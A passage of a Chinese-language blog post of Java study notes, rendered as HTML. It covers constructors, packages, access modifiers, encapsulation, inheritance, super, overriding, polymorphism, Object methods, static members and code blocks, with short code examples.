class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">T</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f2</span><span class="params">()</span> &#123;</span><br><span class="line">        f1();</span><br><span class="line">        <span class="built_in">this</span>.f1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>访问构造器语法:this (参数列表)；只能在构造器中使用（只能在构造器中访问另一个构造器）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">T</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//如果要在构造器中用this访问另一个构造器</span></span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;tch&quot;</span>,<span class="number">21</span>);<span class="comment">//this语句必须要在第一行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">T</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="包"><a class="markdownIt-Anchor" href="#包">#</a> 包</h1><p>包实际上就是创建不同的文件夹来保存类文件</p><h2 id="作用"><a class="markdownIt-Anchor" href="#作用">#</a> 作用：</h2><ul><li>区分相同名字的类</li><li>当类很多时，可以很好的管理类</li><li>控制访问范围</li></ul><h2 id="命名规范"><a class="markdownIt-Anchor" href="#命名规范">#</a> 命名规范</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般的命名规范</span></span><br><span class="line">com.公司名.项目名.业务模块名</span><br><span class="line"><span class="comment">//eg:</span></span><br><span class="line">com.sina.crm.user<span class="comment">//用户模块</span></span><br><span class="line">com.sina.crm.order<span class="comment">//订单模块</span></span><br><span class="line">com.sina.crm.utils<span class="comment">//工具类</span></span><br></pre></td></tr></table></figure><h2 id="常用的包"><a class="markdownIt-Anchor" href="#常用的包">#</a> 常用的包</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.*<span class="comment">//lang包时基本包，默认引入</span></span><br><span class="line">java.util.*<span class="comment">//系统提供的工具，工具类，使用Scanner</span></span><br><span class="line">java.net.*<span class="comment">//网络包，网络开发</span></span><br><span class="line">java.awt.*<span class="comment">//java界面开发，GUI</span></span><br></pre></td></tr></table></figure><h2 id="细节-2"><a class="markdownIt-Anchor" href="#细节-2">#</a> 细节</h2><ul><li>package 的作用是声明当前类所在的包，需要放在类的最上面，一个类中最多只有一句 package</li><li>import 指令位置放在 package 的下面，在类定义前面，可以有多句且没有顺序要求</li></ul><h1 id="访问修饰符"><a class="markdownIt-Anchor" href="#访问修饰符">#</a> 访问修饰符</h1><ol><li>公开级别：用 public 修饰，对外公开</li><li>受保护级别：protected，对子类和同一个包中的类公开</li><li>默认级别：没有修饰符号，向同一个包的类公开</li><li>私有级别：private，只有类本身可以访问，不对外公开</li></ol><h1 id="封装encapsulation"><a class="markdownIt-Anchor" href="#封装encapsulation">#</a> 封装 encapsulation</h1><p>封装就是把抽象出的数据 [属性] 和对数据的操作 [方法] 封装在一起，数据被保护在内部，程序的其他部分只有通过被授权的操作 [方法]，才能对数据进行操作</p><h2 id="封装的好处"><a class="markdownIt-Anchor" href="#封装的好处">#</a> 封装的好处</h2><ol><li>隐藏实现细节：方法 (连接数据库)&lt;–调用 (传入参数)</li><li>可与对数据进行验证，保证安全合理</li></ol><h2 id="封装的实现步骤"><a class="markdownIt-Anchor" href="#封装的实现步骤">#</a> 封装的实现步骤</h2><ul><li><p>将属性进行私有化【不能直接修改属性】</p></li><li><p>提供一个公共的 (public) set 方法，用于对属性判断并赋值</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setXxx</span><span class="params">(类型 参数名)</span>&#123;<span class="comment">//Xxx表示某个属性</span></span><br><span class="line">    <span class="comment">//加入数据验证的业务逻辑</span></span><br><span class="line">    属性 = 参数名;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>提供一个公共的 (public) get 方法，用于获取属性的值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> 数据类型 getXxx()&#123;<span class="comment">//权限判断，Xxx某个属性</span></span><br><span class="line">    <span class="keyword">return</span> xx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="getter和setter"><a class="markdownIt-Anchor" href="#getter和setter">#</a> Getter 和 Setter</h2><p>Getter 和 Setter 方法可以直接在别的类中访问或修改私有属性，它们提供了封装性，检验和操作的功能，通过规范的命名和方法签名，可以提高代码的可读性和维护性</p><p>快捷键：Alt + insert（笔记本加 Fn）</p><h3 id="作用-2"><a class="markdownIt-Anchor" href="#作用-2">#</a> 作用</h3><ul><li><p>Getter 和 Setter 方法的使用可以有效地控制对对象属性的访问和修改，提供了封装性和安全性</p></li><li><p>通过 Getter 方法，其他类可以获取属性的值而不需要直接访问属性</p></li><li><p>通过 Setter 方法，其他类可以修改属性的值而不需要直接修改属性</p></li><li><p>封装性：通过 Getter 和 Setter 方法，可以对属性的访问和修改进行控制</p></li><li><p>验证和操作：可以在 Getter 和 Setter 方法中实现对属性的验证和操作，例如范围检查、格式转换等，确保数据的合法性</p></li><li><p>可读性和可维护性：通过 Getter 和 Setter 方法可以提供更具描述性和可读性的代码，使代码更易于理解和维护</p></li></ul><h1 id="继承"><a class="markdownIt-Anchor" href="#继承">#</a> 继承</h1><p>在一些问题中可能会出现，很多类的属性和方法都一样，这就造成了代码复用的现象，代码冗余度很高，继承就可以解决代码复用性的问题。</p><p>当多个类存在相同属性和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过 extends 来声明继承父类即可。</p><p><img src="/2024/12/06/java%E7%AC%94%E8%AE%B0/C:%5CUsers%5CAhan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240815120355095.png" alt="image-20240815120355095"></p><h2 id="语法"><a class="markdownIt-Anchor" href="#语法">#</a> 语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class 子类 extends 父类 &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类会自动拥有父类定义的属性和方法</span></span><br><span class="line"><span class="comment">//父类也叫超类，基类</span></span><br><span class="line"><span class="comment">//子类又叫派生类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pupil</span> <span class="keyword">extends</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testing</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在考小学数学&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="细节-3"><a class="markdownIt-Anchor" href="#细节-3">#</a> 细节</h2><ul><li>子类继承了所有的属性和方法，但是私有属性和方法不能在子类直接访问，要通过公共的方法去访问</li><li>子类必须调用父类的构造器，完成对父类的初始化</li><li>当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参构造器，则必须在子类的构造器中用 super 去指定使用父类的哪个构造器完成对父类的初始化工作，否则编译不会通过</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比如现在的父类就没有无参构造器，但是有形参为String，int的构造器，那么可以这样使用super();</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Sub</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;jack&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;子类Sub()构造器被调用。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果希望指定去调用父类的某个构造器，则显示的调用一下</li><li>super 在使用时，需要放在构造器第一行</li><li>super () 和 this () 都只能放在构造器的第一行，因此这两个方法不能共存在一个构造器</li><li>java 所有类都是 Object 类的子类，Object 类是所有类的基类</li><li>父类构造器的调用不限于直接父类，将一直往上追溯，直到 Object 类 (顶级父类)</li><li>子类最多只能继承一个父类（指直接继承），即 java 中是单继承机制。</li></ul><p>如果要让 A 继承 B 和 C，得先 A 继承 B，B 继承 C</p><ul><li>不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关系</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cat <span class="keyword">extends</span> <span class="title class_">Animal</span><span class="comment">//合理</span></span><br><span class="line"></span><br><span class="line">Person <span class="keyword">extends</span> <span class="title class_">Music</span><span class="comment">//不合理</span></span><br></pre></td></tr></table></figure><h1 id="super关键字"><a class="markdownIt-Anchor" href="#super关键字">#</a> super 关键字</h1><p>用 super 调用父类的构造器，可使分工明确，父类属性由父类初始化，子类的属性由子类初始化</p><h2 id="语法-2"><a class="markdownIt-Anchor" href="#语法-2">#</a> 语法</h2><ul><li>访问父类的属性，但不能访问父类的 private 属性super. 属性名</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="built_in">super</span>.n1+<span class="built_in">super</span>.n2);</span><br></pre></td></tr></table></figure><ul><li>访问父类的方法，不能访问父类的 private 方法    super. 方法名 ()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">super</span>.test();</span><br></pre></td></tr></table></figure><ul><li>访问父类的构造器    super (参数列表)；只能放在构造器的第一句</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">super</span>(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">super</span>(<span class="string">&quot;jack, 22&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="细节-4"><a class="markdownIt-Anchor" href="#细节-4">#</a> 细节</h2><ul><li>当子类中有和父类中的成员重名时，为了访问父类的成员，必须通过 super，如果没有重名，使用 super、this、直接访问时一样的效果</li><li>super 的访问不限于直接父类，如果爷爷类和本类中有同名的成员，也可以使用 super 去访问爷爷类的成员；如果多个基类中都有同名的成员，使用 super 访问遵循就近原则。</li></ul><h1 id="方法重写覆盖override"><a class="markdownIt-Anchor" href="#方法重写覆盖override">#</a> 方法重写 / 覆盖 (override)</h1><p>方法覆盖就是子类有一个方法和父类的某个方法的名称、返回类型、参数一样，那么我们就说子类的这个方法覆盖了父类的那个方法 +</p><p>** 作用：** 可以达到不更改父类的方法便创建了子类的一个方法。使程序更加的安全</p><h2 id="注意事项和使用细节"><a class="markdownIt-Anchor" href="#注意事项和使用细节">#</a> 注意事项和使用细节</h2><ul><li>子类的方法的参数，方法名称，要和父类方法的参数名称完全一样</li><li>子类方法的返回类型和父类方法返回类型一样，或者是父类返回类型的子类，比如父类返回类型是 object，子类返回类型是 String</li><li>子类方法不能缩小父类方法的访问权限</li></ul><h1 id="多态"><a class="markdownIt-Anchor" href="#多态">#</a> 多态</h1><p>问题引出：一个主人有几个宠物，比如小狗和猫，小狗吃骨头，猫吃鱼，可能还会吃别的东西，那么在这种情况下，我们要建立一个小狗的类、小猫的类，还有食物的类，而食物又分为骨头，鱼，后面可能还会有别的，那么这些食物就是 food 的子类。在这种情况下，我每多一个宠物，我就要在主方法中多写一个方法来调用他们，这样会随着项目的扩展导致方法数量太多，不利于管理和维护</p><p>而在多态的情况下，父类对象可以指向子类对象，那么只要是这个父类的子类，都可以直接传入同一个方法中来调用，根据子类的不同而输出不同的值</p><h2 id="方法的多态"><a class="markdownIt-Anchor" href="#方法的多态">#</a> 方法的多态</h2><p>方法的重写和重载就体现了多态</p><h2 id="对象的多态"><a class="markdownIt-Anchor" href="#对象的多态">#</a> 对象的多态</h2><ol><li>一个对象的编译类型和运行类型可以不一致</li><li>编译类型在定义对象时就确定了，不能改变</li><li>运行类型是可以变化的</li><li>编译类型看定义时 “=” 号的左边，运行类型看 “=” 号的右边</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();<span class="comment">//animal编译类型是Animal，运行类型是Dog</span></span><br><span class="line">animal = <span class="keyword">new</span> <span class="title class_">Cat</span>();<span class="comment">//animal的运行类型变成了Cat，编译类型仍然是Animal</span></span><br></pre></td></tr></table></figure><h2 id="注意事项-2"><a class="markdownIt-Anchor" href="#注意事项-2">#</a> 注意事项</h2><ul><li>多态的前提是两个对象（类）存在继承关系</li><li>属性没有重写之说，属性的值看编译类型。（如果转型的类中有和父类一样的属性，那么就看编译的是哪个类，值就是哪个类的值）</li><li>instanceof 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的（前面这个是否为后面这个的）<strong>子类型</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//编译类型运行类型都为BB，但BB是AA的子类，所以返回结果都为ture</span></span><br><span class="line"><span class="type">BB</span> <span class="variable">bb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BB</span>();</span><br><span class="line">System.out.println(bb <span class="keyword">instanceof</span> BB);</span><br><span class="line">System.out.println(bb <span class="keyword">instanceof</span> AA);</span><br><span class="line"></span><br><span class="line"><span class="comment">//aa编译类型AA，运行类型BB</span></span><br><span class="line"><span class="type">AA</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BB</span>();</span><br><span class="line">System.out.println(aa <span class="keyword">instanceof</span> AA);</span><br><span class="line">System.out.println(aa <span class="keyword">instanceof</span> BB);</span><br><span class="line"><span class="comment">//返回结果都为ture</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AA</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BB</span> exetnds AA&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="多态向上转型"><a class="markdownIt-Anchor" href="#多态向上转型">#</a> 多态向上转型</h3><p>本质：父类的引用指向了子类的对象（也就是向上转型）。只要是继承关系，父类都可以指向下面的任意子类</p><p>特点：编译类型看左边，运行类型看右边</p><p>语法：父类类型应用名 = new 子类类型 ();</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br></pre></td></tr></table></figure><ul><li>可以调用父类中的所有成员（需遵守访问权限，比如私有就无法调用）</li><li>不能调用子类中的特有成员（父类中没有的，就不能调用）</li><li>最终的运行效果看子类的具体实现</li></ul><h3 id="向下转型"><a class="markdownIt-Anchor" href="#向下转型">#</a> 向下转型</h3><p>为了代码维护的便利，我们利用多态的性质进行了一个向上转型，但当我们在向上转型之后，又需要用到子类中的成员，但此时无法引用，这还是就可以向下转型进行一个强转，强行把指向父类又改成指向子类，这样就可以使用子类的成员了</p><p>语法：子类类型引用名 = （子类类型）父类引用；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> (Cat) animal;</span><br></pre></td></tr></table></figure><ul><li>只能强转父类的引用，不能强转父类的对象</li><li>要求父类引用必须指向的是<strong>当前目标类型</strong>的对象（就是如果要向下转型，你转型的目标原本就是这个类型的，只不过之前向上转型了，现在相当于是复原回它原本的类型）</li><li>可以调用子类类型中所有的成员</li></ul><h2 id="java动态绑定机制"><a class="markdownIt-Anchor" href="#java动态绑定机制">#</a> java 动态绑定机制</h2><ol><li>当调用对象方法的时候，该方法回合该对象的内存地址 (也就是运行类型) 绑定</li><li>当调用对象属性时，没有动态绑定机制，哪里声明就用哪里的</li></ol><h2 id="多态数组"><a class="markdownIt-Anchor" href="#多态数组">#</a> 多态数组</h2><p>数组的定义类型为父类类型，里面保存的实际元素类型为子类类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Student和Teacher都是Person的子类，数组为Person类，里面的数据可以存放子类</span></span><br><span class="line">Person[] persons = <span class="keyword">new</span> <span class="title class_">Person</span>[<span class="number">5</span>];</span><br><span class="line">persons[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;jack&quot;</span>, <span class="number">20</span>);</span><br><span class="line">persons[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;tch&quot;</span>, <span class="number">21</span>);</span><br><span class="line">persons[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Teacher</span>(<span class="string">&quot;king&quot;</span>, <span class="number">30</span>, <span class="number">20000</span>);</span><br></pre></td></tr></table></figure><h2 id="多态参数"><a class="markdownIt-Anchor" href="#多态参数">#</a> 多态参数</h2><p>方法定义的形参类型为父类类型，实参类型允许为子类类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">tch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;tch&quot;</span>, <span class="number">21</span>);</span><br><span class="line"><span class="type">Teacher</span> <span class="variable">jack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>(<span class="string">&quot;jack&quot;</span>, <span class="number">35</span>);</span><br><span class="line"><span class="comment">//这里Student和Teacher都是Person的子类，可以直接将这样一个对象传给AAA的形参</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">AAA</span><span class="params">(Person a)</span> &#123;</span><br><span class="line">    System.out.println(a.say());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="object类"><a class="markdownIt-Anchor" href="#object类">#</a> Object 类</h1><h2 id><a class="markdownIt-Anchor" href="#">#</a> ==</h2><ol><li>== 既可以判断基本类型，又可以判断引用类型</li><li>== 如果判断基本类型，判断的是值是否相等</li><li>== 如果判断引用类型，判断的是地址是否相等，即判定是不是同一个对象</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A a = new A();</span><br><span class="line">A b = a;</span><br><span class="line">A c = b;</span><br></pre></td></tr></table></figure><h2 id="equals"><a class="markdownIt-Anchor" href="#equals">#</a> equals()</h2><p>equals 是 Object 类中的方法，<strong>只能判断引用类型</strong>，默认判断的是地址是否相等，子类中往往<strong>要重写该方法</strong>，用于判断内容是否相等，比如 Integer，String，这两个之所以可以直接比较值，是因为 integer 类和 String 类中已经重写了 equals 方法</p><p>如果没有重写 equals 方法，那么就是比较地址，如果重写了，就是比较重写的值，根据这个我们可以自己重写我们所需要的 equals 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> gender;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写Object的equals方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="comment">//判断如果比较的两个对象是同一个对象，返回ture</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//类型判断</span></span><br><span class="line">        <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> Person) &#123;<span class="comment">//是Person才开始比较，否则直接返回false</span></span><br><span class="line">            <span class="comment">//进行类型转换，现在相当于是Object类，所以需要向下转型,我需要得到obj的各个属性来进行判断</span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person)obj;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(p.name) &amp;&amp; <span class="built_in">this</span>.age == p.age &amp;&amp; <span class="built_in">this</span>.gender == p.gender;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="hashcode方法"><a class="markdownIt-Anchor" href="#hashcode方法">#</a> hashCode 方法</h2><p>返回该对象的哈希码值，支持此方法是为了提高哈希表的性能。</p><ol><li>提高具有哈希结构的容器的效率</li><li>两个引用，如果一个指向的是同一个对象，哈希值一样</li><li>如果指向的是不同的对象，哈希值不一样</li><li>哈希值主要根据地址号计算，不能完全将哈希值等价于地址</li><li>后面在集合中，hashCode 如果需要的话，也可以重写</li></ol><h2 id="tostring方法"><a class="markdownIt-Anchor" href="#tostring方法">#</a> toString 方法</h2><ul><li>默认返回：全类名 (包名 + 类名)+@+ 哈希值的 16 进制，子类往往重写 toString 方法，用于返回对象的属性信息</li><li>重写 toString 方法，打印对象或拼接对象时，都会自动调用该对象的 toString 形式</li><li>当直接输出一个对象时，toString 方法会被默认的调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写toString方法输出对象的属性，使用快捷键alt+insert -&gt; toStirng</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Monster</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> String job;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Monster</span><span class="params">(String name, <span class="type">int</span> age, String job)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.job = job;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//重写后一般是把对象的属性值输出，也可以自己定制</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Monster&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, job=&#x27;&quot;</span> + job + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="finalize方法"><a class="markdownIt-Anchor" href="#finalize方法">#</a> finalize 方法</h2><p>这个实际开发中几乎不会用，应付面试</p><ol><li>当对象被回收时，系统自动调用该对象的 finalize 方法，释放资源，子类可重写该方法</li><li>什么时候被回收：当某个对象没有任何引用时，jvm 会认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象之前，会先调用 finalize 方法</li><li>垃圾回收机制的调用，是由系统来决定 (即有自己的 GC 算法)，也可以通过 System.gc () 主动触发垃圾回收机制</li></ol><h1 id="断点调试"><a class="markdownIt-Anchor" href="#断点调试">#</a> 断点调试</h1><ul><li>在断点调试过程中，是运行状态，是以对象的运行类型来执行的</li></ul><h2 id="快捷键"><a class="markdownIt-Anchor" href="#快捷键">#</a> 快捷键</h2><p>F7（跳入）shift+F8（跳出）F9（resume，执行到下一个断点）</p><p>F7：跳入方法内F8：逐行执行代码shift+F8：跳出方法</p><h1 id="类变量和类方法"><a class="markdownIt-Anchor" href="#类变量和类方法">#</a> 类变量和类方法</h1><p>类变量和类方法也叫做静态变量和静态方法，可以直接使用而<strong>不需要初始化</strong>，对所有对象都共享。</p><ul><li>在 java7 以上，静态变量和静态方法都是储存在方法区；java7 及以下的静态变量储存在常量池的一个专门储存 static 变量的地方</li><li>类方法中不能使用和对象有关的关键字，比如 this 和 super</li><li>静态方法只能访问静态变量或方法</li><li>静态方法不能被重写</li></ul><h1 id="main方法语法"><a class="markdownIt-Anchor" href="#main方法语法">#</a> main 方法语法</h1><ul><li>main 方法接受 String 类型的数组参数，该数组中保存执行 java 命令时传递给所运行的类的参数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//语法：java 执行的程序 参数1 参数2 参数3</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;args.length; i++) &#123;</span><br><span class="line">            System.out.println(args[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在cmd中执行这个程序，然后输入“java hello tch tchh tchhh”，就会输出这几个字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="代码块"><a class="markdownIt-Anchor" href="#代码块">#</a> 代码块</h1><p>代码块又称为初始化块，属于类中的成员，是类的一部分，类似于方法，将逻辑语句封装在方法体中，用 {} 包围。但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显示调用，而是加载类时，或创建对象时隐式调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基本语法</span></span><br><span class="line">[修饰符]&#123;</span><br><span class="line"><span 